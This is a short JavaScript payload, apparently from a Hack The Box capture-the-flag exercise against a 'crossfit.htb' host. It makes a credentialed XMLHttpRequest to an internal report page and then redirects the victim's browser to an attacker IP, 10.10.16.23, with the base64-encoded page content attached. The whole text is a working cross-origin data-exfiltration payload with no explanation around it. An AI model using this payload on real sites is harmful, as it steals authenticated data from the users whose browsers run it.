var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://gym-club.crossfit.htb/security_threat/report.php',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='//10.10.16.23/log?key=' + btoa(this.responseText);
};
